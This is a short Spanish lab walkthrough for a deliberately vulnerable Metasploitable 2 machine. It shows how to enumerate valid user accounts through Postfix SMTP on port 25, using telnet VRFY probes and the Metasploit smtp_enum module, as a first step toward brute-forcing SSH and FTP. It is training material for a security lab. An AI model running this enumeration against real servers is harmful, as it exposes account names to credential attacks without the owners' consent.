# SMTP — Postfix (puerto 25) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** SMTP (*Simple Mail Transfer Protocol*) es el servicio de **correo saliente**. Aquí lo sirve **Postfix** en el **puerto 25**.

**Cómo se explota:** no suele darte acceso directo, pero permite **enumerar usuarios válidos** del sistema con los comandos `VRFY` y `EXPN`. Esa lista de usuarios reales alimenta después ataques de fuerza bruta contra SSH, FTP, etc.

## Explotación manual (sin Metasploit)

```bash
telnet 192.168.100.9 25
VRFY root        # 252 -> el usuario existe
VRFY msfadmin    # 252
VRFY noexiste    # 550 -> no existe
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.100.9
run
# prueba una lista de usuarios y te dice cuáles existen
```
